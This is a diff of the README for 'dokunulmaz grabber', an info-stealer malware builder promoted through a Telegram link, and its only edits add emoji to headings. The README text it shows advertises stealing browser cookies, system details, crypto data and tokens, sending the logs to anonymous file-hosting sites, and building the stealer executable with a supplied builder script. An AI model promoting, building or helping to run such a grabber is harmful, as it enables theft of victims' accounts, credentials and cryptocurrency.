@@ -2,7 +2,7 @@
 t.me/dokunulmazgrabber
 
 
-# features
+# features🐀
 📁 - 4 Supported Files Upload Websites (Catbox.moe, gofile.io, anonymfile.com, file.io)
 
 🗂️ - Logs (Everything in 1 zip file)
@@ -23,7 +23,7 @@ t.me/dokunulmazgrabber
 
  
 
-🖥️ - Computer Information Stealer: Steal graphic card name (and other data), cpu name (and other data), Installed AVs and more.. 
+📂 - Computer Information Stealer: Steal graphic card name (and other data), cpu name (and other data), Installed AVs and more.. 
 
 
 🍪 - Cookie Stealer: Steals cookies of any browser
@@ -78,7 +78,7 @@ double clicking install.bat file
 Run the builder by double clicking the builder.pyw file
 Follow instructions in builder and your exe will be found in the dist folder under the name dokunulmaz grabber.exe
 
-# Prerequisites
+# Prerequisites📂
 • Windows 10
 
 • python (3.11.6 version)
@@ -87,7 +87,7 @@ Follow instructions in builder and your exe will be found in the dist folder und
 
 
 
-# Browser 
+# Browser 🌐
 Browsers	Browser
 Data	Crypto Data	Token Grab
 
